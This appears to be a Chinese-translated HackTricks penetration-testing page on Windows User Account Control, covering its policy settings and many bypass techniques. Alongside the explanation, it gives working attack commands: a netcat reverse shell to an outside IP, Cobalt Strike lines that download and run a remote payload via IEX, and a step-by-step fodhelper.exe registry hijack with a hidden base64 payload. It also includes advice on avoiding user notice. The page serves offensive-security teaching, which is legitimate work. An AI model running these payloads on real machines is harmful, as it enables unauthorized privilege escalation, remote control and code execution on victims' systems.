# UAC - 用户帐户控制

{{#include ../../banners/hacktricks-training.md}}

## UAC

[User Account Control (UAC)](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 是一项用于在需要提升权限的操作时显示同意提示的功能。应用程序具有不同的 `integrity` 级别，具有**高完整性级别**的程序可以执行**可能危及系统安全**的任务。当启用 UAC 时，应用程序和任务通常在**非管理员帐户的安全上下文**下运行，除非管理员显式授权这些应用/任务以管理员级别访问系统运行。它是保护管理员免受无意更改的便捷功能，但不被视为安全边界。

有关完整性级别的更多信息：

{{#ref}}
../windows-local-privilege-escalation/integrity-levels.md
{{#endref}}

当启用 UAC 时，管理员用户会获得两个令牌：一个用于以常规权限执行常规操作的标准用户令牌，以及一个包含管理员权限的令牌。

此 [页面](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/how-user-account-control-works) 详细讨论了 UAC 的工作原理，包括登录过程、用户体验和 UAC 架构。管理员可以使用安全策略在本地级别（使用 secpol.msc）配置 UAC 的行为，或者在 Active Directory 域环境中通过 Group Policy Objects (GPO) 配置和下发。各种设置的详细说明见 [这里](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-security-policy-settings)。共有 10 个可以为 UAC 设置的组策略项，下面的表格提供了附加细节：

| Group Policy Setting                                                                                                                                                                                                                                                                                                                                                           | Registry Key                | Default Setting                                              |
| ------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------ | --------------------------- | ------------------------------------------------------------ |
| [User Account Control: Admin Approval Mode for the built-in Administrator account](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-admin-approval-mode-for-the-built-in-administrator-account)                                                     | FilterAdministratorToken    | Disabled（禁用）                                              |
| [User Account Control: Allow UIAccess applications to prompt for elevation without using the secure desktop](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-allow-uiaccess-applications-to-prompt-for-elevation-without-using-the-secure-desktop) | EnableUIADesktopToggle      | Disabled（禁用）                                              |
| [User Account Control: Behavior of the elevation prompt for administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-administrators-in-admin-approval-mode)                     | ConsentPromptBehaviorAdmin  | Prompt for consent for non-Windows binaries（对非 Windows 二进制文件提示同意） |
| [User Account Control: Behavior of the elevation prompt for standard users](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-behavior-of-the-elevation-prompt-for-standard-users)                                                                   | ConsentPromptBehaviorUser   | Prompt for credentials on the secure desktop（在安全桌面上提示凭据） |
| [User Account Control: Detect application installations and prompt for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-detect-application-installations-and-prompt-for-elevation)                                                       | EnableInstallerDetection    | Enabled (default for home) Disabled (default for enterprise)（家庭版默认启用，企业版默认禁用） |
| [User Account Control: Only elevate executables that are signed and validated](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-executables-that-are-signed-and-validated)                                                             | ValidateAdminCodeSignatures | Disabled（禁用）                                              |
| [User Account Control: Only elevate UIAccess applications that are installed in secure locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-only-elevate-uiaccess-applications-that-are-installed-in-secure-locations)                       | EnableSecureUIAPaths        | Enabled（启用）                                               |
| [User Account Control: Run all administrators in Admin Approval Mode](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-run-all-administrators-in-admin-approval-mode)                                                                               | EnableLUA                   | Enabled（启用）                                               |
| [User Account Control: Switch to the secure desktop when prompting for elevation](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-switch-to-the-secure-desktop-when-prompting-for-elevation)                                                       | PromptOnSecureDesktop       | Enabled（启用）                                               |
| [User Account Control: Virtualize file and registry write failures to per-user locations](https://docs.microsoft.com/en-us/windows/security/identity-protection/user-account-control/user-account-control-group-policy-and-registry-key-settings#user-account-control-virtualize-file-and-registry-write-failures-to-per-user-locations)                                       | EnableVirtualization        | Enabled（启用）                                               |

### UAC 绕过原理

如果用户属于**administrator group**，某些程序会被**自动提升（autoelevated）**。这些二进制文件在其 _**Manifests**_ 中包含了值为 _**autoElevate**_ 的选项并设置为 _**True**_。该二进制文件通常还需要**由 Microsoft 签名**。

许多 auto-elevate 进程通过 **COM objects 或 RPC servers** 暴露功能，这些功能可以从具有 medium integrity（常规用户级别权限）的进程中调用。注意 COM (Component Object Model) 和 RPC (Remote Procedure Call) 是 Windows 程序用于在不同进程间通信和执行函数的方法。例如，**`IFileOperation COM object`** 用于处理文件操作（复制、删除、移动），并可以在不提示的情况下自动提升权限。

注意某些检查可能会被执行，比如检查进程是否从 **System32** 目录运行，这类检查可以通过例如 **向 explorer.exe 注入** 或注入另一个位于 System32 的可执行文件来绕过。

另一种绕过这些检查的方法是修改 PEB。Windows 中的每个进程都有一个 Process Environment Block (PEB)，其中包含有关进程的重要数据，例如其可执行文件路径。通过修改 PEB，攻击者可以伪造（spoof）其恶意进程的位置，使其看起来像是从受信任的目录（例如 system32）运行。这种伪造信息会欺骗 COM 对象，在不提示用户的情况下自动提升权限。

然后，为了**绕过 UAC**（将完整性级别从 **medium** 提升到 **high**），一些攻击者利用这类二进制文件来**执行任意代码**，因为该代码会在**高完整性级别进程**中执行。

你可以使用来自 Sysinternals 的工具 _**sigcheck.exe**_ 检查二进制的 _**Manifest**_。（`sigcheck.exe -m <file>`）并且可以使用 _Process Explorer_ 或 _Process Monitor_（来自 Sysinternals）查看进程的 **integrity level**。

### 检查 UAC

要确认 UAC 是否启用，请执行：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v EnableLUA

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
EnableLUA    REG_DWORD    0x1
```
如果是 **`1`** 则 UAC **已激活**，如果是 **`0`** 或者不存在，则 UAC **未激活**。

然后，检查 **哪个级别** 被配置：
```
REG QUERY HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System\ /v ConsentPromptBehaviorAdmin

HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Policies\System
ConsentPromptBehaviorAdmin    REG_DWORD    0x5
```
- If **`0`** then, UAC won't prompt (like **disabled**)  
- If **`1`** the admin is **asked for username and password** to execute the binary with high rights (on Secure Desktop)  
- If **`2`** (**Always notify me**) UAC will always ask for confirmation to the administrator when he tries to execute something with high privileges (on Secure Desktop)  
- If **`3`** like `1` but not necessary on Secure Desktop  
- If **`4`** like `2` but not necessary on Secure Desktop  
- if **`5`**(**default**) it will ask the administrator to confirm to run non Windows binaries with high privileges

然后，查看 **`LocalAccountTokenFilterPolicy`** 的值\
如果该值是 **`0`**，那么只有 **RID 500** 用户（**built-in Administrator**）能够在 **没有 UAC** 的情况下执行管理员任务；如果是 `1`，则 **所有位于 "Administrators" 组内的账户** 都可以执行这些操作。

最后查看键 **`FilterAdministratorToken`** 的值\
如果 **`0`**（默认），**built-in Administrator account can** 执行远程管理任务；如果 **`1`**，**built-in account Administrator cannot** 执行远程管理任务，除非 `LocalAccountTokenFilterPolicy` 被设置为 `1`。

#### Summary

- If `EnableLUA=0` or **doesn't exist**, **no UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=1` , No UAC for anyone**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=0`, No UAC for RID 500 (Built-in Administrator)**  
- If `EnableLua=1` and **`LocalAccountTokenFilterPolicy=0` and `FilterAdministratorToken=1`, UAC for everyone**

All this information can be gathered using the **metasploit** module: `post/windows/gather/win_privs`

You can also check the groups of your user and get the integrity level:
```
net user %username%
whoami /groups | findstr Level
```
## UAC 绕过

> [!TIP]
> 注意，如果你有受害者的图形界面访问权限，UAC 绕过非常简单，因为当 UAC 提示出现时你只需点击“是”。

UAC 绕过在以下情况下需要：**UAC 已启用，你的进程运行在中等完整性上下文（medium integrity context），并且你的用户属于 Administrators 组**。

需要指出的是，**如果 UAC 处于最高安全级别（Always），比起处于其他任何级别（Default）要难得多**。

### UAC 已禁用

如果 UAC 已经被禁用（`ConsentPromptBehaviorAdmin` 是 **`0`**），你可以使用类似下面的方法**以管理员权限执行 reverse shell**（高完整性级别）：
```bash
#Put your reverse shell instead of "calc.exe"
Start-Process powershell -Verb runAs "calc.exe"
Start-Process powershell -Verb runAs "C:\Windows\Temp\nc.exe -e powershell 10.10.14.7 4444"
```
#### UAC bypass with token duplication

- [https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/](https://ijustwannared.team/2017/11/05/uac-bypass-with-token-duplication/)
- [https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html](https://www.tiraniddo.dev/2018/10/farewell-to-token-stealing-uac-bypass.html)

### **非常** Basic UAC "bypass" (完整文件系统访问)

If you have a shell with a user that is inside the Administrators group you can **mount the C$** shared via SMB (文件系统) local in a new disk and you will have **access to everything inside the file system** (even Administrator home folder).

> [!WARNING]
> **看起来这个技巧不再有效了**
```bash
net use Z: \\127.0.0.1\c$
cd C$

#Or you could just access it:
dir \\127.0.0.1\c$\Users\Administrator\Desktop
```
### UAC bypass with cobalt strike

Cobalt Strike 技术只有在 UAC 未设置为其最高安全级别时才会生效。
```bash
# UAC bypass via token duplication
elevate uac-token-duplication [listener_name]
# UAC bypass via service
elevate svc-exe [listener_name]

# Bypass UAC with Token Duplication
runasadmin uac-token-duplication powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
# Bypass UAC with CMSTPLUA COM interface
runasadmin uac-cmstplua powershell.exe -nop -w hidden -c "IEX ((new-object net.webclient).downloadstring('http://10.10.5.120:80/b'))"
```
**Empire** 和 **Metasploit** 也有若干模块可以 **bypass** **UAC**。

### KRBUACBypass

Documentation and tool in [https://github.com/wh0amitz/KRBUACBypass](https://github.com/wh0amitz/KRBUACBypass)

### UAC bypass exploits

[**UACME** ](https://github.com/hfiref0x/UACME) 是若干 UAC bypass exploits 的 **集合**。注意你需要使用 **Visual Studio 或 msbuild 来编译 UACME**。编译会生成多个可执行文件（例如 `Source\Akagi\outout\x64\Debug\Akagi.exe`），你需要知道 **哪个是你需要的。**\
你应该 **小心**，因为某些 bypasses 会 **触发其他程序的提示**，从而 **提醒** **用户** 有异常发生。

UACME 列出了每种技术开始生效的 **构建版本**。你可以搜索影响你版本的技术：
```
PS C:\> [environment]::OSVersion.Version

Major  Minor  Build  Revision
-----  -----  -----  --------
10     0      14393  0
```
Also, using [this](https://en.wikipedia.org/wiki/Windows_10_version_history) page you get the Windows release `1607` from the build versions.

### UAC Bypass – fodhelper.exe (Registry hijack)

受信任的二进制文件 `fodhelper.exe` 在较新的 Windows 上会自动提升权限。启动时，它会查询下面的每用户注册表路径，但不会验证 `DelegateExecute` 动作。在该位置植入命令可以让一个 Medium Integrity 进程（用户属于 Administrators）在不弹出 UAC 提示的情况下生成一个 High Integrity 进程。

Registry path queried by fodhelper:
```
HKCU\Software\Classes\ms-settings\Shell\Open\command
```
PowerShell 步骤 (设置你的 payload，然后触发):
```powershell
# Optional: from a 32-bit shell on 64-bit Windows, spawn a 64-bit PowerShell for stability
C:\\Windows\\sysnative\\WindowsPowerShell\\v1.0\\powershell -nop -w hidden -c "$PSVersionTable.PSEdition"

# 1) Create the vulnerable key and values
New-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Force | Out-Null
New-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "DelegateExecute" -Value "" -Force | Out-Null

# 2) Set default command to your payload (example: reverse shell or cmd)
# Replace <BASE64_PS> with your base64-encoded PowerShell (or any command)
Set-ItemProperty -Path "HKCU:\Software\Classes\ms-settings\Shell\Open\command" -Name "(default)" -Value "powershell -ExecutionPolicy Bypass -WindowStyle Hidden -e <BASE64_PS>" -Force

# 3) Trigger auto-elevation
Start-Process -FilePath "C:\\Windows\\System32\\fodhelper.exe"

# 4) (Recommended) Cleanup
Remove-Item -Path "HKCU:\Software\Classes\ms-settings\Shell\Open" -Recurse -Force
```
Notes:
- 当当前用户属于 Administrators 并且 UAC 级别为默认/宽松（不是设置为 Always Notify 并带有额外限制）时可行。
- 使用 `sysnative` 路径在 64-bit Windows 上从 32-bit 进程启动 64-bit PowerShell。
- Payload 可以是任何命令（PowerShell、cmd，或 EXE 路径）。为隐蔽起见，避免触发弹出提示界面。

#### 更多 UAC 绕过方法

**All** the techniques used here to bypass AUC **require** a **full interactive shell** with the victim (a common nc.exe shell is not enough).

You can get using a **meterpreter** session. Migrate to a **process** that has the **Session** value equals to **1**:

![](<../../images/image (863).png>)

(_explorer.exe_ 应该可行)

### 使用 GUI 绕过 UAC

如果可以访问 **GUI，你可以在弹出 UAC 提示时直接接受**，其实不需要真正的绕过方法。因此，获得 GUI 访问即可让你绕过 UAC。

此外，如果你获得了某人在使用的 GUI 会话（可能通过 RDP），会有 **一些以管理员身份运行的工具**，你可以从那里直接以管理员身份运行一个 **cmd**，例如 [**https://github.com/oski02/UAC-GUI-Bypass-appverif**](https://github.com/oski02/UAC-GUI-Bypass-appverif)，而不会再次被 UAC 提示打断。这可能更具 **隐蔽性**。

### 嘈杂的强制提升 UAC 绕过

如果你不在乎噪声，可以运行类似 [**https://github.com/Chainski/ForceAdmin**](https://github.com/Chainski/ForceAdmin) 的工具，它会不断请求权限提升，直到用户接受为止。

### 自行开发绕过方法 - 基本 UAC 绕过方法论

如果查看 **UACME**，你会注意到 **大多数 UAC 绕过利用了 Dll Hijacking vulnerabilit**y（主要是将恶意 dll 写入 _C:\Windows\System32_）。[Read this to learn how to find a Dll Hijacking vulnerability](../windows-local-privilege-escalation/dll-hijacking/index.html).

1. 找到会 **autoelevate** 的二进制（执行时在高完整性级别运行）。
2. 使用 procmon 查找可以导致 **DLL Hijacking** 的 "**NAME NOT FOUND**" 事件。
3. 你很可能需要将 DLL 写入一些 **受保护路径**（如 C:\Windows\System32），这些路径可能没有写权限。你可以使用以下方法绕过：
1. **wusa.exe**: Windows 7,8 and 8.1。它允许将 CAB 文件的内容提取到受保护路径中（因为该工具以高完整性级别执行）。
2. **IFileOperation**: Windows 10。
4. 准备一个 **script**，将你的 DLL 复制到受保护路径并执行易受攻击且 autoelevated 的二进制。

### 另一种 UAC 绕过技术

该方法是观察某个 **autoElevated binary** 是否尝试从 **registry** 读取将要 **执行** 的 **binary** 或 **command** 的 **name/path**（如果该二进制在 **HKCU** 中查找该信息则更为有趣）。

## References
- [HTB: Rainbow – SEH overflow to RCE over HTTP (0xdf) – fodhelper UAC bypass steps](https://0xdf.gitlab.io/2025/08/07/htb-rainbow.html)
- [LOLBAS: Fodhelper.exe](https://lolbas-project.github.io/lolbas/Binaries/Fodhelper/)
- [Microsoft Docs – How User Account Control works](https://learn.microsoft.com/windows/security/identity-protection/user-account-control/how-user-account-control-works)
- [UACME – UAC bypass techniques collection](https://github.com/hfiref0x/UACME)

{{#include ../../banners/hacktricks-training.md}}
